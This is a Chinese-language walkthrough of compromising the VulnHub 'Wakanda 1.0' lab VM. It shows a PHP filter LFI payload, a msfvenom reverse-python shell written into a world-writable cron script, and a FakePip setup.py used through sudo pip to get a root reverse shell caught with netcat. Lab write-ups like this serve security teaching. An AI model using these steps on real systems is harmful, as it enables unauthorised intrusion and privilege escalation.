# Wakanda 1.0

## Information

Wakanda 1.0 is a vulnerable VM created by [VulnHub](https://www.vulnhub.com/entry/wakanda-1,251/). 

[合天网安](https://www.hetianlab.com/expc.do?ec=ECIDe03d-decc-44c8-8129-e89b639605b4)

## 思路

## 0x01 扫描

- `nmap -sP 10.1.1.1/24` 找到主机
- `nmap -A 10.1.1.91` 找到开放端口和服务

扫描出 22/tcp, 80/tcp, 111/tcp

## 0x02 分析
打开 80/tcp 网站找线索，在网站页脚处发现作者为 mamadou， 从源码中发现注释掉的 HTML 代码，去掉注释后发现是一个切换网页语言的链接，点击链接后通过网络请求观察发现是一个 GET 请求，通过参数为 `lang`，值为 `fr` 获取页面而非跳转，所以可以尝试参数注入。

尝试利用 [php伪协议](../blogs/php_filter.md) 读取首页php源码 `http://10.1.1.91/?lang=php://filter/read=convert.base64-encode/resource=index` 。

参数注入成功，将返回的 base64 编码进行解码获得一串密码，尝试使用密码登录 SSH 服务，成功登录，用户为 mamadou 普通用户。

## 0x03 提权

### 从普通用户到普通用户

获得 mamadou 用户权限后，查看 `/home` 目录下的是否其他用户的家目录，发现有一个 `devops` 用户目录，接下来需要获取 `devops` 用户的权限。

- `find` 查找一下 `devops` 用户的文件 `find / -user devops 2>/dev/null`，发现有两个文件 `/srv/.antivirus.py`, `/tmp/test`。
- `ls` 查看两个文件都没有 SUID 权限，所以 SUID 提权方式不可行。但 `/srv/.antivirus.py` 文件对其他用户具有可写权限。
- `cat` 查看 `/srv/.antivirus.py` 文件，发现是一个 python 脚本，脚本的作用是在 `/tmp/test` 文件内写入 `test` 字符串。
- `cat` 查看 `/tmp/test` 文件，发现文件内有 `test` 字符串。
- 推测 `/srv/.antivirus.py` 是一个定时脚本文件，尝试在其中写入反弹 shell 命令，从而获得 `devops` 用户权限。
- 利用 msfvenom 生成反弹 shell 的 python 脚本 `msfvenom -p cmd/unix/reverse_python lhost=10.1.1.91 lport=6666 R`，将生成的脚本去掉`python -c`后写入 `/srv/.antivirus.py` 文件中。
- 同时在攻击机器上监听端口 `nc -lvnp 6666`，等待反弹 shell。即可获得 `devops` 用户权限。

### 从普通用户到 root 用户

主要提权方式有三种：

- SUID 提权
- 内核漏洞提权
- SUDO 提权

#### SUID 提权

对于 SUID 提权，首先需要找到 SUID 文件，然后分析 SUID 文件的权限，最后利用 SUID 文件的权限提权。

`find / -user root -perm -4000 -print 2>/dev/null` 

并没有留下什么可利用的程序，那么 SUID 提权这一办法是不太可行了。

#### 内核漏洞提权

对于内核漏洞提权，首先需要找到内核版本，然后根据内核版本找到对应的漏洞，最后利用漏洞提权。

`uname -a`

内核版本很新，近期没有可利用的漏洞。

#### SUDO 提权

这篇文章有关于 [SUDO 提权的详细介绍](../blogs/linux_sudo.md)，这里就不再赘述了。

对于 SUDO 提权，首先检查一下 当前用户是否在 sudoers 文件中，然后查看 sudoers 文件中的权限，最后利用 sudoers 文件中的权限提权。

使用 `sudo -l` 查看当前用户的权限，发现可以使用 `sudo` 命令执行 `/usr/bin/pip`，而且不需要密码。

查看 `/usr/bin/pip` 文件的权限 `ls -l /usr/bin/pip` ，发现文件具有 SGID 权限。

???+ tip "如何利用 pip 提权"
    
    pip 是一个 Python语言写的软件包管理器，通常用来安装 Python 软件包。如何利用呢？既然 pip 是安装 Python 软件包的，那我们就可以在安装过程中做手脚

这里使用的脚本是 [FakePip](https://github.com/0x00-0x00/FakePip)，这个脚本的原理就是在安装软件包的过程中运行反弹shell命令，从而获得 root 权限。

使用方式很简单，只需将 `setup.py` 文件下载到被攻击机器并修改文件中的 `RHOST` ，然后在本地文件夹中执行：

`sudo /usr/bin/pip install . --upgrade --force-reinstall`

???+ warning "注意"

    需要先在攻击机器上监听端口 `nc -lvnp 443`，等待反弹 shell。因为执行pip命令后会立即反弹 shell，所以需要先监听端口。

同时在本机监听端口 `nc -lvnp 443`，等待反弹 shell。即可获得 `root` 用户权限。

## 总结

- [Linux SUID 提权](../blogs/linux_suid.md)
- [Linux SUDO 提权](../blogs/linux_sudo.md)
- [PHP 伪协议](../blogs/php_filter.md)